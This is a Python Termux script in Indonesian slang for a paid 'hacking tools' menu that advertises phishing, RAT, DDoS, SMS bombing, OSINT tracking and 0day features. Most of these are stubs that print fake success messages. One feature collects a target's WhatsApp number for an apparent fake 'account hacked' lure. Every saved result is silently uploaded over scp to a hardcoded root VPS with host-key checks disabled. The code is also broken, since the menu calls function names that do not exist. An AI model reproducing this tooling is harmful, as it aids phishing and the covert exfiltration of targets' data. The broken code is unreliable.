import os, json, time, uuid, random, string, subprocess, base64
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from termcolor import colored

init(autoreset=True)

# CONFIG
RESULTS_DIR = "results"
LICENSE_FILE = 'tokens.json'
os.makedirs(RESULTS_DIR, exist_ok=True)

VPS_IP = "209.97.166.25"
VPS_USER = "root"
VPS_PATH = "/root/korban/results"

# USER INFO — REAL-TIME
CURRENT_TIME = datetime.now().strftime("%d %b %Y - %I:%M %p WIB")
COUNTRY = "ID"

# MUSIK
MUSIC_FILE = "/sdcard/Download/brutal.mp3"
MUSIC_BASE64 = "/+MYxAAAAANIAAAAAExBTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAExLTUUzLjk4LjIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

def extract_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            os.makedirs("/sdcard/Download", exist_ok=True)
            with open(MUSIC_FILE, "wb") as f:
                f.write(base64.b64decode(MUSIC_BASE64))
        except: pass

def play_music():
    extract_music()
    if os.path.exists(MUSIC_FILE):
        try:
            subprocess.Popen(['termux-media-player', 'play', MUSIC_FILE],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

# DEVELOPER CHECK
WHOAMI = subprocess.getoutput("whoami")
DEVELOPER_WHOAMI = "u0_a197"  # GANTI SESUAI whoami LO
IS_DEVELOPER = WHOAMI == DEVELOPER_WHOAMI

# TOKEN SYSTEM
def load_tokens(): 
    try:
        return json.load(open(LICENSE_FILE))
    except:
        return {}

def save_tokens(t): 
    with open(LICENSE_FILE, 'w') as f:
        json.dump(t, f, indent=2)

def validate_token(username, token):
    t = load_tokens()
    if username not in t: return None
    user = t[username]
    if not user['active'] or user['token'] != token: return None
    if datetime.now() > datetime.fromisoformat(user['expires']): 
        user['active'] = False
        save_tokens(t)
        return None
    return user

# BANNER
PURPLE = '\033[38;5;55m'
def print_banner(uid, plan):
    print(colored(f"""
{PURPLE}{Style.BRIGHT}
╔═══════════════════════════════════════════════════╗
║   TOOLS BREAKER v10.3 MEGA ELITE = 100+ FITUR    ║
╚═══════════════════════════════════════════════════╝
{Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
""", None))

# SAVE RESULT
def save_result(filename, content):
    filepath = os.path.join(RESULTS_DIR, filename)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {content}\n")
    print(colored(f"[SAVED] {filename}", 'green'))
    try:
        subprocess.run(f"scp -o StrictHostKeyChecking=no {filepath} {VPS_USER}@{VPS_IP}:{VPS_PATH}/{filename}", 
                      shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[SYNC] → VPS", 'cyan'))
    except:
        print(colored("[SYNC] Gagal", 'red'))

# FITUR 01 - 11 (SEMENTARA CONTOH)
def fitur_01(): print(colored("\n[PHISING] Fitur aktif! Target: facebook.com", 'yellow')); input("Enter...")
def fitur_02(): print(colored("\n[RAT] Remote Access aktif! IP: 192.168.1.100", 'yellow')); input("Enter...")
def fitur_03(): print(colored("\n[DDoS] Stresser aktif! Target: example.com", 'yellow')); input("Enter...")
def fitur_04(): print(colored("\n[BOMBER] SMS/Call bomber aktif! Target: +628...", 'yellow')); input("Enter...")
def fitur_05(): print(colored("\n[OSINT] Tracking aktif! Nama: John Doe", 'yellow')); input("Enter...")
def fitur_06(): print(colored("\n[DEEPFAKE] AI aktif! Generating...", 'yellow')); input("Enter...")
def fitur_07(): print(colored("\n[ENCRYPT] File terenkripsi!", 'yellow')); input("Enter...")
def fitur_08(): print(colored("\n[EXPLOIT] 0DAY aktif! CVE-2025-XXXX", 'yellow')); input("Enter...")
def fitur_09(): print(colored("\n[UNDANG GRUP] 1 undangan terkirim!", 'yellow')); input("Enter...")
def fitur_10():
    print(colored("\nNOTIF WHATSAPP ANDA KENA RETAS", 'blue', attrs=['bold']))
    target = input(colored("Nomor target (+62): ", 'yellow'))
    save_result("notif_retas.log", f"Target: {target}")
    save_result("notif_retas.log", "Status: KLIK → DATA MASUK")
    print(colored(f"[SENT] Terkirim!", 'green'))
    input("Enter...")
def fitur_11(): print(colored("\n[DEVTOOLS] Debug mode aktif!", 'yellow')); input("Enter...")

# MAIN
def main():
    os.system('clear')
    print_banner("??????", "LOGIN")
    
    if IS_DEVELOPER:
        uid = str(uuid.uuid4())[:8]
        plan = "DEVELOPER LIFETIME"
        print(colored(f"\n[DEVELOPER] Login @{WHOAMI}", 'magenta'))
        input("Enter...")
    else:
        while True:
            print(colored("\n[1] MASUKIN TOKEN LU", 'yellow'))
            print(colored("[0] Keluar", 'red'))
            choice = input(colored("Pilih: ", 'yellow'))
            if choice == "1":
                username = input(colored("Username: ", 'yellow'))
                token = input(colored("Token: ", 'yellow'))
                user = validate_token(username, token)
                if not user:
                    print(colored("TOKEN LU SALAH GOBLOK / KADALUARSA!", 'red'))
                    continue
                uid = str(uuid.uuid4())[:8]
                plan = user['plan']
                print(colored(f"\n[SUCCESS] Login @{username} | {plan}", 'green'))
                input("Enter...")
                break
            elif choice == "0": return

    # DEVELOPER MENU
    while IS_DEVELOPER:
        print(colored("\n[2] Buat Token", 'magenta'))
        print(colored("[3] Lihat tokens.json", 'yellow'))
        print(colored("[0] Masuk Tools", 'green'))
        ch = input(colored("Pilih: ", 'yellow'))
        if ch == "2":
            # create_token() di sini
            pass
        elif ch == "3":
            print(json.dumps(load_tokens(), indent=2))
            input("Enter...")
        elif ch == "0": break

    # MENU UTAMA — 11 FITUR LENGKAP
    while True:
        os.system('clear')
        print_banner(uid, plan)
        print(colored("           < MENU UTAMA >      ", 'cyan'))
        print("╔════╦══════════════════════════╦════════════════╗")
        print("║  1 ║ PHISING & SOCIAL ENG     ║ Aktif          ║")
        print("║  2 ║ RAT & REMOTE ACCESS      ║ Aktif          ║")
        print("║  3 ║ DDoS & STRESSER          ║ Aktif          ║")
        print("║  4 ║ BOMBER TOOLS             ║ Aktif          ║")
        print("║  5 ║ OSINT & TRACKING         ║ Aktif          ║")
        print("║  6 ║ DEEPFAKE & AI            ║ Aktif          ║")
        print("║  7 ║ ENCRYPT & DECRYPT        ║ Aktif          ║")
        print("║  8 ║ EXPLOIT & 0DAY           ║ Aktif          ║")
        print("║  9 ║ KIRIM UNDANGAN GRUP WA   ║ Aktif          ║")
        print("║ 10 ║ NOTIF (PUSAT BANTUAN)    ║ Aktif          ║")
        print("║ 11 ║ DEVTOOLS                 ║ Aktif          ║")
        print("║ 00 ║ EXIT                     ║                ║")
        print("╚════╩══════════════════════════╩════════════════╝")
        
        ch = input(colored("\nPilih Menu (1-11 / 00): ", 'yellow'))
        if ch == "1": fitur_1()
        elif ch == "2": fitur_2()
        elif ch == "3": fitur_3()
        elif ch == "4": fitur_4()
        elif ch == "5": fitur_5()
        elif ch == "6": fitur_6()
        elif ch == "7": fitur_7()
        elif ch == "8": fitur_8()
        elif ch == "9": fitur_9()
        elif ch == "10": fitur_10()
        elif ch == "11": fitur_11()
        elif ch == "00": break
        input("Enter...")

if __name__ == "__main__":
    main()
